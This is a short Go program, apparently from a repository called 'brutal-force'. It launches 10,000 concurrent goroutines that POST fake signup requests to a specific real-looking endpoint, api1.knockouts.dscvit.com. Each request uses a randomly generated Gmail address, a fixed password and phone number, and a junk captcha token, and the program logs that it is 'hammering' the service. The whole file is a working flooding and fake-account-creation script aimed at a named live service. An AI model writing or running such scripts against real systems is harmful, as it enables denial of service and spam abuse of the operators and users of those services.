package main

import (
	"bytes"
	"fmt"
	"github.com/ATechnoHazard/brutal-force/signup"
	"github.com/google/uuid"
	"io/ioutil"
	"log"
	"net/http"
)

func main()  {
	for i := 0; i < 10000; i++ {
		id, err := uuid.NewUUID()
		if err != nil {
			log.Println(err)
			continue
		}
		email := fmt.Sprintf("%v@gmail.com", id.String())
		go testSignup(email)
		log.Println("Hammering with", email)
	}
	select {}
}

func testSignup(email string)  {
	url := "https://api1.knockouts.dscvit.com/api/auth/signup/"
	method := "POST"

	payload := signup.Request{
		Username: email,
		Password: "RendumShit",
		Phone:    "9869609516",
		FullName: "John Doe",
		GToken:   "dfsdffffffffffffsdfdfdfgdfg",
	}

	postBody, err := payload.Marshal()

	client := &http.Client {
	}
	req, err := http.NewRequest(method, url, bytes.NewReader(postBody))
	if err != nil {
		log.Println(err)
		return
	}
	req.Header.Add("Content-Type", "application/json")

	res, err := client.Do(req)
	if err != nil {
		log.Println(err)
		return
	}

	defer res.Body.Close()
	body, err := ioutil.ReadAll(res.Body)

	fmt.Println(string(body))
}